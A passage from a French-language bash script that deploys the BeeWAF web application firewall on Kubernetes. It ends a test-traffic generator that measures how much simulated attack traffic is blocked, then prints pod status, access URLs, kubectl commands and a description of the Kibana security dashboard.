        # Légitime
        send("GET", random.choice(legitimate_paths), attack_type="legitimate")
    else:
        # Attaque
        send("GET", random.choice(burst_attacks), attack_type="Burst Attack")
    time.sleep(0.02)

# ═══════════════════════════════════════════════════════════════
# RÉSULTATS
# ═══════════════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("  📊 RÉSULTATS DU TEST")
print("=" * 60)
print(f"  Total requêtes:   {stats['total']}")
print(f"  ✅ Autorisées:     {stats['passed']}")
print(f"  🚫 Bloquées:       {stats['blocked']}")
print(f"  ❌ Erreurs:        {stats['errors']}")
if stats["total"] > 0:
    rate = (stats["blocked"] / stats["total"]) * 100
    print(f"  📈 Taux de blocage: {rate:.1f}%")
print("\n  🔥 Attaques bloquées par type:")
for atype, count in sorted(stats["attacks_by_type"].items(), key=lambda x: -x[1]):
    print(f"    • {atype}: {count}")
print("=" * 60)
TRAFFIC_GEN

echo -e "${GREEN}  ✅ Trafic de test généré${NC}"

# ─────────────────────────────────────────────────────────────────────────────
# Étape 6 : Résumé final
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${YELLOW}[6/6] Résumé final...${NC}"
echo ""

echo -e "${BOLD}${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${CYAN}║  🐝 BeeWAF Enterprise v6.0 — DÉPLOIEMENT RÉUSSI !           ║${NC}"
echo -e "${BOLD}${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${BOLD}📦 État des pods :${NC}"
kubectl get pods -n "$NAMESPACE" -o wide
echo ""

KIBANA_NODEPORT=$(kubectl get svc kibana -n "$NAMESPACE" -o jsonpath='{.spec.ports[0].nodePort}' 2>/dev/null || echo "30561")
BEEWAF_NODEPORT=$(kubectl get svc beewaf-svc -n "$NAMESPACE" -o jsonpath='{.spec.ports[0].nodePort}' 2>/dev/null || echo "N/A")

echo -e "${BOLD}🌐 URLs d'accès :${NC}"
echo -e "  📊 Kibana (NodePort):    ${GREEN}http://192.168.90.10:${KIBANA_NODEPORT}${NC}"
echo -e "  📊 Kibana (Ingress):     ${GREEN}http://kibana.dpc.com.tn${NC}"
echo -e "  🐝 BeeWAF (NodePort):    ${GREEN}http://192.168.90.10:${BEEWAF_NODEPORT}${NC}"
echo -e "  🐝 BeeWAF (Ingress):     ${GREEN}https://beewaf.dpc.com.tn${NC}"
echo ""

echo -e "${BOLD}🔧 Commandes utiles :${NC}"
echo -e "  # Voir les logs ELK :"
echo -e "  kubectl logs -f deploy/elasticsearch -n beewaf"
echo -e "  kubectl logs -f deploy/logstash -n beewaf"
echo -e "  kubectl logs -f deploy/kibana -n beewaf"
echo -e "  kubectl logs -f ds/filebeat -n beewaf"
echo ""
echo -e "  # Port-forward Kibana (si NodePort ne fonctionne pas) :"
echo -e "  kubectl port-forward svc/kibana 5601:5601 -n beewaf"
echo ""
echo -e "  # SSH tunnel depuis Kali :"
echo -e "  ssh -L 5601:localhost:30561 user@192.168.90.10"
echo ""

echo -e "${BOLD}📋 Dashboard Kibana :${NC}"
echo -e "  1. Ouvrir Kibana dans un navigateur"
echo -e "  2. Aller dans ${CYAN}Analytics → Dashboard${NC}"
echo -e "  3. Ouvrir ${CYAN}🐝 BeeWAF Enterprise — Security Dashboard${NC}"
echo -e "  4. Sélectionner la période : ${CYAN}Last 1 hour${NC}"
echo ""
echo -e "  Le dashboard contient :"
echo -e "    📊 Total requêtes    🚫 Total bloqué      ⏱️ Latence moyenne"
echo -e "    🔴 Types d'attaques  🛡️ Bloqué vs Autorisé ⚡ Sévérité"
echo -e "    🏴‍☠️ Top IPs            🎯 Top chemins       📡 Méthodes HTTP"
echo -e "    📈 Timeline           ☁️ Tags sécurité     🚨 Détails attaques"
echo ""

echo -e "${BOLD}${GREEN}✅ Déploiement terminé avec succès !${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
